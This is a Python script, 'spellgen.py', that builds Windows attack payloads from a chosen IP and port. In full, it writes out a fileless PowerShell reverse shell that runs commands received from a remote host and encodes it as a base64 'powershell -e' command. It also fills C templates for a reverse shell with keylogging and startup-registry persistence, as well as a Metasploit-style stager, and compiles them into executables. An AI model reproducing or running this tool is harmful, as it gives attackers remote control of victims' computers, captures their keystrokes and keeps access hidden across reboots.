import sys
import base64
import subprocess

def help():
	print("Usage: spellgen.py <payload> <IP> <PORT>")

	print("\n\tpayload: spellshell")
	print("\t\tFully specialized reverse shell with keylogging and persistance capabilities")
	print("\t\tCommand: whataretheywriting- start writing keystrokes to a file")
	print("\t\tCommand: persist- add your reverse shell to the startup registry")
	print("\t\tCommand: spawn- spawn another instance of the reverse shell")
	print("\t\tArguments: <C2C IP> <C2C Port>")

	print("\n\tpayload: powershell")
	print("\t\tBase64 encoded fileless powershell reverse shell")
	print("\t\tArguments: <C2C IP> <C2C Port>")

	print("\n\tpayload: msf")
	print("\t\tStandard msfvenom generated reverse shell staged payload")
	print("\t\tArguments: <STAGER IP> <STAGER Port>")
	print("\t\tDependencies: sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 wine64")

def powershell(ip, port):
	payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
	payload = payload % (ip, port)

	cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

	print(cmdline)
	
def msf(IP, PORT):
	with open("msf_template.c", "r") as temp, open("payload_msf.c", "w") as pay:
		l=temp.readlines()
		l[0]=f'#define IPADDR "{IP}"'
		l[1]=f'#define PORT {PORT}'

		for line in l:
			pay.write(line+'\n')

		print("[+] payload saved to payload_msf.c")
		print("[*] compilation: gcc -o payload_msf.exe payload_msf.c -lwsock32 -lwininet")


def spellshell(IP, PORT):
	with open("spellshell_template.c", "r") as temp, open("payload_spellshell.c", "w") as pay:
		l=temp.readlines()
		l[0]=f'#define IPADDR "{IP}"'
		l[1]=f'#define PORT {PORT}'

		for line in l:
			pay.write(line+'\n')

		print("[+] payload saved to payload_spellshell.c")


	try:
		cmd=subprocess.Popen(['x86_64-w64-mingw32-gcc', '-g', '-o', 'payload_spellshell.exe', 'payload_spellshell.c', '-lwsock32', '-lwininet'], stdout=subprocess.PIPE)
		out=cmd.stdout.read()
		print("[+] executable saved as payload_spellshell.exe")
	except:
		print("[-] mingw is not installed on your system")


######################################
################### main #############
######################################

try:
	(payload, IP, PORT)=(sys.argv[1], sys.argv[2], int(sys.argv[3]))
except:
	help()
	exit()


if payload=='powershell':
	powershell(IP, PORT)
elif payload=='spellshell':
	spellshell(IP, PORT)
elif payload=='msf':
	msf(IP, PORT)
else:
	help()
	exit()
